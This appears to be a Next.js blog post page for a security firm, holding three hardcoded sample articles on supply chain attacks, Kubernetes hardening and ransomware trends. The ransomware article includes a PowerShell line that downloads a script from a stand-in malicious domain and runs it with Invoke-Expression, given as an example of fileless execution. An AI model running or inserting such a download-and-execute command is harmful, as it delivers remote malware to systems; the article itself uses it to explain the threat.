"use client"

import { useEffect, useState } from "react"
import Link from "next/link"
import Image from "next/image"
import { useParams, useRouter } from "next/navigation"
import {
  ArrowLeft,
  Calendar,
  Clock,
  Tag,
  Heart,
  Linkedin,
  Twitter,
  Facebook,
  Copy,
  Github,
  Youtube,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Badge } from "@/components/ui/badge"
import { Card, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { toast } from "@/hooks/use-toast"

// Custom icon components for HackerOne and Bugcrowd
const HackerOneIcon = (props) => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="24"
    height="24"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    {...props}
  >
    <path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z" />
    <path d="M7.5 12.5L10 15l6.5-6.5" />
  </svg>
)

const BugcrowdIcon = (props) => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="24"
    height="24"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    {...props}
  >
    <path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z" />
    <path d="M12 16a4 4 0 100-8 4 4 0 000 8z" />
    <path d="M12 8v2M12 14v2M8 12h2M14 12h2" />
  </svg>
)

// Sample blog posts data - in a real app, this would come from a database or API
const blogPosts = [
  {
    title: "The Rise of Supply Chain Attacks",
    excerpt: "How attackers are increasingly targeting software supply chains as an entry point into organizations.",
    content:
      "<p>Supply chain attacks have become increasingly prevalent in recent years, with high-profile incidents like SolarWinds and Kaseya demonstrating the devastating potential of this attack vector.</p>" +
      "<h2>What is a Supply Chain Attack?</h2>" +
      "<p>A supply chain attack occurs when an attacker compromises a trusted vendor or supplier to gain access to their customers. By infiltrating a single point in the supply chain, attackers can potentially compromise hundreds or thousands of organizations downstream.</p>" +
      "<h2>Notable Recent Incidents</h2>" +
      "<ul>" +
      "<li><strong>SolarWinds</strong>: Attackers inserted malicious code into SolarWinds' Orion software updates, affecting up to 18,000 customers including government agencies.</li>" +
      "<li><strong>Kaseya</strong>: Ransomware attackers exploited vulnerabilities in Kaseya's VSA software to deploy ransomware to managed service providers and their customers.</li>" +
      "<li><strong>CodeCov</strong>: Attackers modified a CodeCov bash uploader script to exfiltrate sensitive information from CI/CD environments.</li>" +
      "</ul>" +
      "<h2>Mitigation Strategies</h2>" +
      "<p>Organizations can take several steps to reduce the risk of supply chain attacks:</p>" +
      "<ol>" +
      "<li>Implement a robust vendor security assessment process</li>" +
      "<li>Use software composition analysis (SCA) tools to identify vulnerable dependencies</li>" +
      "<li>Verify the integrity of software packages and updates</li>" +
      "<li>Apply the principle of least privilege to third-party integrations</li>" +
      "<li>Develop an incident response plan specifically for supply chain compromises</li>" +
      "</ol>" +
      "<h2>The Future of Supply Chain Security</h2>" +
      "<p>As organizations improve their direct security posture, attackers will continue to target the supply chain as a path of least resistance. We expect to see increased focus on securing software development pipelines, package repositories, and third-party integrations in the coming years.</p>" +
      "<p>The industry is responding with initiatives like:</p>" +
      "<ul>" +
      "<li>Software Bills of Materials (SBOMs)</li>" +
      "<li>Sigstore for software signing and verification</li>" +
      "<li>Enhanced security requirements in government and regulated industries</li>" +
      "</ul>" +
      "<p>Organizations must remain vigilant and proactive in addressing this evolving threat landscape.</p>",
    image: "/placeholder.svg?height=400&width=600",
    date: "2023-12-10",
    author: "Robin Chang",
    authorImage: "/placeholder.svg?height=100&width=100",
    authorTitle: "Security Researcher",
    authorBio:
      "Robin is a security researcher specializing in supply chain security and software composition analysis. With over 10 years of experience in the cybersecurity industry, they have helped numerous organizations improve their security posture.",
    category: "Trends",
    likes: 124,
    readTime: "8 min",
    tags: ["Supply Chain", "Software Security", "DevSecOps"],
    slug: "the-rise-of-supply-chain-attacks",
  },
  {
    title: "Securing Kubernetes Environments",
    excerpt: "Best practices for hardening Kubernetes clusters against the most common attack vectors in production.",
    content:
      "<p>Kubernetes has become the de facto standard for container orchestration, but its complex nature introduces numerous security challenges. This article explores comprehensive strategies for securing Kubernetes environments in production.</p>" +
      "<h2>Understanding the Kubernetes Security Landscape</h2>" +
      "<p>Before diving into specific hardening techniques, it's essential to understand the Kubernetes security model and its potential attack surfaces:</p>" +
      "<ul>" +
      "<li>Control plane components (API server, etcd, scheduler)</li>" +
      "<li>Worker nodes and kubelet</li>" +
      "<li>Container runtime</li>" +
      "<li>Network policies and communication</li>" +
      "<li>Secrets management</li>" +
      "<li>RBAC and authentication</li>" +
      "</ul>" +
      "<p>Each of these components requires specific security considerations to create a defense-in-depth approach.</p>" +
      "<h2>Cluster Configuration Hardening</h2>" +
      "<p>The foundation of Kubernetes security begins with proper cluster configuration. The following screenshot shows a vulnerability scan of a default Kubernetes installation:</p>" +
      '<div class="image-container">' +
      '<img src="/placeholder.svg?height=400&width=800" alt="Kubernetes vulnerability scan showing multiple security issues" />' +
      '<p class="image-caption">Figure 1: Vulnerability scan of a default Kubernetes installation</p>' +
      "</div>" +
      "<p>To address these vulnerabilities, implement these critical configurations:</p>" +
      "<h3>API Server Security</h3>" +
      "<p>The API server is the primary entry point for all administrative operations. Secure it by:</p>" +
      "<ul>" +
      "<li>Enabling RBAC and disabling legacy authorization modes</li>" +
      "<li>Using strong authentication methods (OpenID Connect, x509 certificates)</li>" +
      "<li>Implementing API server admission controllers</li>" +
      "<li>Restricting access to the API server endpoint</li>" +
      "</ul>" +
      "<p>Here's an example of a properly configured kube-apiserver with security-focused flags:</p>" +
      "<pre><code>kube-apiserver \\\n" +
      "--anonymous-auth=false \\\n" +
      "--audit-log-path=/var/log/kubernetes/audit.log \\\n" +
      "--audit-log-maxage=30 \\\n" +
      "--audit-log-maxbackup=10 \\\n" +
      "--audit-log-maxsize=100 \\\n" +
      "--authorization-mode=Node,RBAC \\\n" +
      "--client-ca-file=/etc/kubernetes/pki/ca.crt \\\n" +
      "--enable-admission-plugins=NodeRestriction,PodSecurityPolicy,ServiceAccount \\\n" +
      "--encryption-provider-config=/etc/kubernetes/encryption/encryption.yaml \\\n" +
      "--tls-cert-file=/etc/kubernetes/pki/apiserver.crt \\\n" +
      "--tls-private-key-file=/etc/kubernetes/pki/apiserver.key</code></pre>" +
      "<h3>etcd Security</h3>" +
      "<p>As the backing store for all cluster data, etcd must be properly secured:</p>" +
      "<ul>" +
      "<li>Enable TLS for etcd peer and client communication</li>" +
      "<li>Implement strong encryption for etcd data at rest</li>" +
      "<li>Restrict access to etcd instances and backup data</li>" +
      "<li>Regularly back up etcd data</li>" +
      "</ul>" +
      "<h2>Pod Security Standards</h2>" +
      "<p>With Kubernetes v1.25, Pod Security Policies (PSP) have been removed in favor of Pod Security Standards (PSS) enforced through admission controllers. Implement these standards at the namespace level:</p>" +
      "<pre><code>apiVersion: v1\n" +
      "kind: Namespace\n" +
      "metadata:\n" +
      "  name: secure-namespace\n" +
      "  labels:\n" +
      "    pod-security.kubernetes.io/enforce: restricted\n" +
      "    pod-security.kubernetes.io/audit: restricted\n" +
      "    pod-security.kubernetes.io/warn: restricted</code></pre>" +
      '<p>This configuration enforces the "restricted" policy, which:</p>' +
      "<ul>" +
      "<li>Prevents containers from running as root</li>" +
      "<li>Requires dropping all capabilities and only adding those specifically needed</li>" +
      "<li>Enforces read-only root filesystems</li>" +
      "<li>Prevents privilege escalation</li>" +
      "<li>Restricts host path mounts</li>" +
      "</ul>" +
      "<h2>Network Security</h2>" +
      "<p>Kubernetes network security requires a multi-layered approach:</p>" +
      "<h3>Network Policies</h3>" +
      "<p>Implement default-deny network policies and explicitly allow only necessary traffic:</p>" +
      "<pre><code>apiVersion: networking.k8s.io/v1\n" +
      "kind: NetworkPolicy\n" +
      "metadata:\n" +
      "  name: default-deny\n" +
      "  namespace: secure-namespace\n" +
      "spec:\n" +
      "  podSelector: {}\n" +
      "  policyTypes:\n" +
      "  - Ingress\n" +
      "  - Egress</code></pre>" +
      "<p>Then, create specific policies for required communication paths:</p>" +
      "<pre><code>apiVersion: networking.k8s.io/v1\n" +
      "kind: NetworkPolicy\n" +
      "metadata:\n" +
      "  name: api-allow\n" +
      "  namespace: secure-namespace\n" +
      "spec:\n" +
      "  podSelector:\n" +
      "    matchLabels:\n" +
      "      app: api\n" +
      "  policyTypes:\n" +
      "  - Ingress\n" +
      "  - Egress\n" +
      "  ingress:\n" +
      "  - from:\n" +
      "    - podSelector:\n" +
      "        matchLabels:\n" +
      "          app: frontend\n" +
      "    ports:\n" +
      "    - protocol: TCP\n" +
      "      port: 8080\n" +
      "  egress:\n" +
      "  - to:\n" +
      "    - podSelector:\n" +
      "        matchLabels:\n" +
      "          app: database\n" +
      "    ports:\n" +
      "    - protocol: TCP\n" +
      "      port: 5432</code></pre>" +
      "<h3>Service Mesh</h3>" +
      "<p>For more advanced security controls, implement a service mesh like Istio or Linkerd that provides:</p>" +
      "<ul>" +
      "<li>Mutual TLS (mTLS) between services</li>" +
      "<li>Fine-grained access control</li>" +
      "<li>Traffic encryption</li>" +
      "<li>Advanced observability</li>" +
      "</ul>" +
      '<div class="image-container">' +
      '<img src="/placeholder.svg?height=400&width=800" alt="Service mesh architecture showing mTLS between services" />' +
      '<p class="image-caption">Figure 2: Service mesh architecture with mTLS between services</p>' +
      "</div>" +
      "<h2>Secrets Management</h2>" +
      "<p>Kubernetes secrets are base64-encoded but not encrypted by default. To properly secure sensitive information:</p>" +
      "<ol>" +
      "<li>Enable encryption at rest for etcd</li>" +
      "<li>Use external secrets management solutions (HashiCorp Vault, AWS Secrets Manager, etc.)</li>" +
      "<li>Implement proper RBAC for secrets access</li>" +
      "<li>Rotate secrets regularly</li>" +
      "</ol>" +
      "<p>Here's an example of integrating HashiCorp Vault with Kubernetes:</p>" +
      "<pre><code>apiVersion: secrets-store.csi.x-k8s.io/v1\n" +
      "kind: SecretProviderClass\n" +
      "metadata:\n" +
      "  name: vault-database\n" +
      "spec:\n" +
      "  provider: vault\n" +
      "  parameters:\n" +
      '    vaultAddress: "https://vault.example.com:8200"\n' +
      '    roleName: "database-role"\n' +
      "    objects: |\n" +
      '      - objectName: "db-password"\n' +
      '        secretPath: "secret/data/database/credentials"\n' +
      '        secretKey: "password"</code></pre>' +
      "<h2>Continuous Security Monitoring</h2>" +
      "<p>Implement robust monitoring and detection capabilities:</p>" +
      "<ul>" +
      "<li>Deploy runtime security tools (Falco, Sysdig, etc.)</li>" +
      "<li>Implement audit logging and alerting</li>" +
      "<li>Use Kubernetes-native security tools (Kube-bench, Kube-hunter)</li>" +
      "<li>Perform regular vulnerability scanning of images and clusters</li>" +
      "</ul>" +
      "<h2>Conclusion</h2>" +
      "<p>Securing Kubernetes environments requires a comprehensive approach that addresses all layers of the stack. By implementing the practices outlined in this article, organizations can significantly reduce their Kubernetes attack surface and build resilient production environments.</p>" +
      "<p>Remember that security is an ongoing process. Regularly review and update your security posture as new vulnerabilities are discovered and best practices evolve.</p>",
    image: "/placeholder.svg?height=400&width=600",
    date: "2023-11-28",
    author: "Avery Martinez",
    authorImage: "/placeholder.svg?height=100&width=100",
    authorTitle: "Cloud Security Engineer",
    authorBio:
      "Avery is a certified Kubernetes administrator with over 8 years of experience in cloud security. They specialize in container security, infrastructure as code, and DevSecOps practices.",
    category: "Cloud Security",
    likes: 98,
    readTime: "12 min",
    tags: ["Kubernetes", "Container Security", "Cloud Native"],
    slug: "securing-kubernetes-environments",
  },
  {
    title: "Breaking Down Ransomware Trends in 2024",
    excerpt:
      "An in-depth analysis of how ransomware tactics are evolving and what organizations should be prepared for.",
    content:
      "<p>Ransomware continues to be one of the most significant cyber threats facing organizations in 2024. This article examines the latest trends, tactics, and mitigation strategies.</p>" +
      "<h2>Evolution of Ransomware Tactics</h2>" +
      "<p>Ransomware has evolved significantly from its early days of simply encrypting files and demanding payment. Today's ransomware attacks are sophisticated operations that often involve:</p>" +
      "<ul>" +
      "<li>Initial access brokers who specialize in gaining entry to networks</li>" +
      "<li>Data exfiltration before encryption (double extortion)</li>" +
      "<li>Threats to publish stolen data (triple extortion)</li>" +
      "<li>Targeting of backup systems to prevent recovery</li>" +
      "<li>Exploitation of supply chain vulnerabilities</li>" +
      "</ul>" +
      "<h2>Emerging Trends in 2024</h2>" +
      "<p>Several key trends have emerged in the ransomware landscape this year:</p>" +
      "<h3>1. Ransomware-as-a-Service (RaaS) Proliferation</h3>" +
      "<p>The RaaS model has lowered the barrier to entry for cybercriminals, allowing even those with limited technical skills to deploy sophisticated ransomware attacks. Major RaaS operations now function like legitimate businesses with:</p>" +
      "<ul>" +
      "<li>Affiliate programs</li>" +
      "<li>Technical support</li>" +
      "<li>Feature updates and bug fixes</li>" +
      "<li>Marketing and recruitment</li>" +
      "</ul>" +
      '<div class="image-container">' +
      '<img src="/placeholder.svg?height=400&width=800" alt="Diagram showing the Ransomware-as-a-Service ecosystem" />' +
      '<p class="image-caption">Figure 1: The Ransomware-as-a-Service ecosystem</p>' +
      "</div>" +
      "<h3>2. Critical Infrastructure Targeting</h3>" +
      "<p>Attacks against critical infrastructure have increased dramatically, with threat actors recognizing that these organizations:</p>" +
      "<ul>" +
      "<li>Often have legacy systems that are difficult to patch</li>" +
      "<li>Cannot tolerate extended downtime</li>" +
      "<li>May have cyber insurance policies that cover ransom payments</li>" +
      "<li>Are under pressure to restore services quickly</li>" +
      "</ul>" +
      "<h3>3. Sophisticated Evasion Techniques</h3>" +
      "<p>Modern ransomware employs advanced evasion techniques to avoid detection:</p>" +
      "<pre><code>// Example of fileless ransomware execution using PowerShell\n" +
      "$code = (New-Object System.Net.WebClient).DownloadString('https://malicious-domain.com/payload.ps1')\n" +
      "Invoke-Expression $code</code></pre>" +
      "<p>Other evasion techniques include:</p>" +
      "<ul>" +
      "<li>Living-off-the-land techniques using legitimate system tools</li>" +
      "<li>Delayed execution to bypass sandbox analysis</li>" +
      "<li>Detecting virtual machines and security tools</li>" +
      "<li>Encrypted command and control communications</li>" +
      "</ul>" +
      "<h2>Mitigation Strategies</h2>" +
      "<p>Organizations should implement a multi-layered defense strategy:</p>" +
      "<h3>1. Proactive Measures</h3>" +
      "<ul>" +
      "<li>Implement robust backup solutions with offline copies</li>" +
      "<li>Regularly test restoration procedures</li>" +
      "<li>Deploy endpoint detection and response (EDR) solutions</li>" +
      "<li>Use application allowlisting where possible</li>" +
      "<li>Implement network segmentation</li>" +
      "</ul>" +
      "<h3>2. Technical Controls</h3>" +
      "<p>Key technical controls include:</p>" +
      "<pre><code># Example PowerShell script to disable macros in Office documents\n" +
      '$regPath = "HKCU:\\Software\\Microsoft\\Office\\16.0\\Word\\Security"\n' +
      'Set-ItemProperty -Path $regPath -Name "VBAWarnings" -Value 4\n' +
      'Set-ItemProperty -Path $regPath -Name "BlockContentExecutionFromInternet" -Value 1</code></pre>' +
      "<ul>" +
      "<li>Email filtering and security awareness training</li>" +
      "<li>Vulnerability management and timely patching</li>" +
      "<li>Multi-factor authentication for all remote access</li>" +
      "<li>Principle of least privilege for user accounts</li>" +
      "</ul>" +
      "<h3>3. Incident Response Planning</h3>" +
      "<p>Develop and regularly test an incident response plan that includes:</p>" +
      "<ul>" +
      "<li>Containment procedures</li>" +
      "<li>Communication protocols</li>" +
      "<li>Decision framework for ransom payment considerations</li>" +
      "<li>Legal and regulatory reporting requirements</li>" +
      "<li>Recovery procedures</li>" +
      "</ul>" +
      "<h2>Conclusion</h2>" +
      "<p>Ransomware will continue to evolve in sophistication and impact throughout 2024. Organizations must stay vigilant, implement defense-in-depth strategies, and prepare for incidents as if they are inevitable rather than merely possible.</p>" +
      "<p>By understanding the latest trends and tactics, security teams can better allocate resources and implement controls that address the most likely attack vectors and techniques used by ransomware operators.</p>",
    image: "/placeholder.svg?height=400&width=600",
    date: "2024-03-10",
    author: "Jane Doe",
    authorImage: "/placeholder.svg?height=100&width=100",
    authorTitle: "Cybersecurity Analyst",
    authorBio:
      "Jane is a cybersecurity analyst with expertise in threat intelligence and incident response. She has helped numerous organizations recover from ransomware attacks and implement effective prevention strategies.",
    category: "Threat Intelligence",
    likes: 85,
    readTime: "12 min",
    tags: ["Ransomware", "Threat Intelligence", "Incident Response"],
    slug: "breaking-down-ransomware-trends-in-2024",
  },
]

export default function BlogPostPage() {
  const params = useParams()
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(true)
  const [blogPost, setBlogPost] = useState(null)
  const [relatedPosts, setRelatedPosts] = useState([])

  useEffect(() => {
    // Find the blog post that matches the slug
    const post = blogPosts.find((post) => post.slug === params.slug)

    if (post) {
      setBlogPost(post)

      // Find related posts (excluding the current post)
      const related = blogPosts
        .filter((p) => p.slug !== post.slug)
        .filter((p) => p.category === post.category || p.tags.some((tag) => post.tags.includes(tag)))
        .slice(0, 3)

      setRelatedPosts(related)
    } else {
      // If no post is found, redirect to the blog listing page
      router.push("/blog")
    }

    // Simulate loading the blog post
    const timer = setTimeout(() => {
      setIsLoading(false)
    }, 500)

    return () => clearTimeout(timer)
  }, [params.slug, router])

  const handleCopyLink = () => {
    navigator.clipboard.writeText(window.location.href)
    toast({
      title: "Link copied",
      description: "The article link has been copied to your clipboard",
    })
  }

  const handleLike = () => {
    toast({
      title: "Article liked",
      description: "Thank you for your feedback!",
    })
  }

  if (isLoading || !blogPost) {
    return (
      <div className="min-h-screen bg-malectrica-dark text-gray-100 flex items-center justify-center">
        <div className="animate-pulse flex flex-col items-center">
          <div className="h-8 w-64 bg-malectrica-blue/20 rounded mb-4"></div>
          <div className="h-4 w-48 bg-malectrica-blue/20 rounded"></div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-malectrica-dark text-gray-100">
      <main className="container py-12">
        <div className="flex flex-col space-y-8">
          {/* Back to blog link */}
          <div className="flex justify-between items-center">
            <Link
              href="/blog"
              className="inline-flex items-center text-malectrica-blue hover:text-malectrica-brightBlue transition-colors"
            >
              <ArrowLeft className="mr-2 h-4 w-4" />
              Back to Blog
            </Link>
          </div>

          {/* Article header */}
          <div className="space-y-4">
            <div className="flex flex-wrap gap-2 items-center">
              <Badge className="bg-malectrica-blue/70 hover:bg-malectrica-blue text-white">{blogPost.category}</Badge>
              <div className="flex items-center text-gray-400 text-sm">
                <Calendar className="mr-1 h-4 w-4" />
                {blogPost.date}
              </div>
              <div className="flex items-center text-gray-400 text-sm">
                <Clock className="mr-1 h-4 w-4" />
                {blogPost.readTime} read
              </div>
            </div>

            <h1 className="text-3xl md:text-4xl font-bold tracking-tight">{blogPost.title}</h1>

            <p className="text-xl text-gray-300">{blogPost.excerpt}</p>

            <div className="flex items-center space-x-4">
              <Avatar className="h-12 w-12">
                <AvatarImage src={blogPost.authorImage || "/placeholder.svg"} alt={blogPost.author} />
                <AvatarFallback className="bg-malectrica-blue/20 text-malectrica-blue">
                  {blogPost.author.charAt(0)}
                </AvatarFallback>
              </Avatar>
              <div>
                <div className="font-medium">{blogPost.author}</div>
                <div className="text-sm text-gray-400">{blogPost.authorTitle}</div>
              </div>
            </div>
          </div>

          {/* Featured image */}
          <div className="relative rounded-lg overflow-hidden">
            <Image
              src={blogPost.image || "/placeholder.svg"}
              alt={blogPost.title}
              width={1200}
              height={600}
              className="w-full object-cover"
            />
          </div>

          {/* Article content */}
          <div className="bg-malectrica-darker rounded-lg p-6 md:p-8 border border-malectrica-blue/20">
            <div className="prose prose-invert max-w-none prose-headings:text-malectrica-blue prose-a:text-malectrica-brightBlue prose-pre:bg-black/50 prose-pre:border prose-pre:border-malectrica-blue/20 prose-pre:rounded-md prose-img:rounded-lg">
              <div dangerouslySetInnerHTML={{ __html: blogPost.content }} />
            </div>

            {/* Tags */}
            <div className="mt-8 pt-6 border-t border-malectrica-blue/20">
              <div className="flex flex-wrap gap-2 items-center">
                <Tag className="h-4 w-4 text-gray-400" />
                {blogPost.tags.map((tag, i) => (
                  <Badge key={i} variant="secondary" className="bg-malectrica-purple/20 text-malectrica-purple">
                    {tag}
                  </Badge>
                ))}
              </div>
            </div>

            {/* Article actions */}
            <div className="mt-6 flex flex-wrap justify-between items-center gap-4">
              <div className="flex items-center gap-2">
                <Button variant="outline" size="sm" className="flex items-center gap-2" onClick={handleLike}>
                  <Heart className="h-4 w-4" />
                  Like ({blogPost.likes})
                </Button>
              </div>

              <div className="flex items-center gap-2">
                <span className="text-sm text-gray-400">Share:</span>
                <Button variant="ghost" size="icon" className="h-8 w-8 rounded-full">
                  <Twitter className="h-4 w-4" />
                  <span className="sr-only">Share on Twitter</span>
                </Button>
                <Button variant="ghost" size="icon" className="h-8 w-8 rounded-full">
                  <Linkedin className="h-4 w-4" />
                  <span className="sr-only">Share on LinkedIn</span>
                </Button>
                <Button variant="ghost" size="icon" className="h-8 w-8 rounded-full">
                  <Facebook className="h-4 w-4" />
                  <span className="sr-only">Share on Facebook</span>
                </Button>
                <Button variant="ghost" size="icon" className="h-8 w-8 rounded-full" onClick={handleCopyLink}>
                  <Copy className="h-4 w-4" />
                  <span className="sr-only">Copy link</span>
                </Button>
              </div>
            </div>
          </div>

          {/* Author bio */}
          <div className="bg-malectrica-darker rounded-lg p-6 border border-malectrica-blue/20">
            <div className="flex flex-col md:flex-row gap-6 items-center md:items-start">
              <Avatar className="h-24 w-24">
                <AvatarImage src={blogPost.authorImage || "/placeholder.svg"} alt={blogPost.author} />
                <AvatarFallback className="bg-malectrica-blue/20 text-malectrica-blue text-xl">
                  {blogPost.author.charAt(0)}
                </AvatarFallback>
              </Avatar>

              <div className="flex-1 text-center md:text-left">
                <h3 className="text-xl font-bold mb-2">About {blogPost.author}</h3>
                <p className="text-gray-300 mb-4">{blogPost.authorBio}</p>
                <div className="flex justify-center md:justify-start gap-2">
                  <Button variant="outline" size="sm" className="rounded-full">
                    <Twitter className="h-4 w-4 mr-2" />
                    Follow
                  </Button>
                  <Button variant="outline" size="sm" className="rounded-full">
                    <Linkedin className="h-4 w-4 mr-2" />
                    Connect
                  </Button>
                </div>
              </div>
            </div>
          </div>

          {/* Related posts */}
          {relatedPosts.length > 0 && (
            <div>
              <h2 className="text-2xl font-bold mb-6">Related Articles</h2>
              <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
                {relatedPosts.map((post, i) => (
                  <Card
                    key={i}
                    className="bg-malectrica-darker border-malectrica-blue/20 hover:bg-malectrica-blue/10 transition-colors"
                  >
                    <div
                      className="h-48 bg-cover bg-center rounded-t-lg"
                      style={{ backgroundImage: `url(${post.image})` }}
                    ></div>
                    <CardHeader className="pb-2">
                      <div className="flex items-center justify-between text-xs mb-2">
                        <Badge className="bg-malectrica-blue/70 hover:bg-malectrica-blue text-white">
                          {post.category}
                        </Badge>
                        <span className="text-gray-400">{post.date}</span>
                      </div>
                      <CardTitle className="text-xl text-white">{post.title}</CardTitle>
                      <CardDescription className="pt-2 text-gray-400">{post.excerpt}</CardDescription>
                    </CardHeader>
                    <CardFooter className="pt-4 flex items-center justify-between">
                      <div className="text-sm text-gray-300">By {post.author}</div>
                      <Link href={`/blog/${post.slug}`}>
                        <Button
                          variant="ghost"
                          size="sm"
                          className="gap-1 text-malectrica-blue hover:text-malectrica-brightBlue"
                        >
                          Read <ArrowLeft className="h-4 w-4 rotate-180" />
                        </Button>
                      </Link>
                    </CardFooter>
                  </Card>
                ))}
              </div>
            </div>
          )}

          {/* Company Socials */}
          <div className="mt-12 mb-8 py-8 border-t border-b border-malectrica-blue/20">
            <div className="text-center">
              <h3 className="text-2xl font-bold mb-4">Connect with Malectrica</h3>
              <p className="text-gray-400 mb-6">Stay updated with our latest research and insights</p>
              <div className="flex justify-center space-x-6">
                <Link href="https://github.com/malectrica" target="_blank" rel="noopener noreferrer">
                  <Button variant="outline" size="icon" className="rounded-full">
                    <Github className="h-5 w-5" />
                    <span className="sr-only">GitHub</span>
                  </Button>
                </Link>
                <Link href="https://youtube.com/malectrica" target="_blank" rel="noopener noreferrer">
                  <Button variant="outline" size="icon" className="rounded-full">
                    <Youtube className="h-5 w-5" />
                    <span className="sr-only">YouTube</span>
                  </Button>
                </Link>
                <Link href="https://linkedin.com/company/malectrica" target="_blank" rel="noopener noreferrer">
                  <Button variant="outline" size="icon" className="rounded-full">
                    <Linkedin className="h-5 w-5" />
                    <span className="sr-only">LinkedIn</span>
                  </Button>
                </Link>
                <Link href="https://hackerone.com/malectrica" target="_blank" rel="noopener noreferrer">
                  <Button variant="outline" size="icon" className="rounded-full">
                    <HackerOneIcon className="h-5 w-5" />
                    <span className="sr-only">HackerOne</span>
                  </Button>
                </Link>
                <Link href="https://bugcrowd.com/malectrica" target="_blank" rel="noopener noreferrer">
                  <Button variant="outline" size="icon" className="rounded-full">
                    <BugcrowdIcon className="h-5 w-5" />
                    <span className="sr-only">Bugcrowd</span>
                  </Button>
                </Link>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  )
}
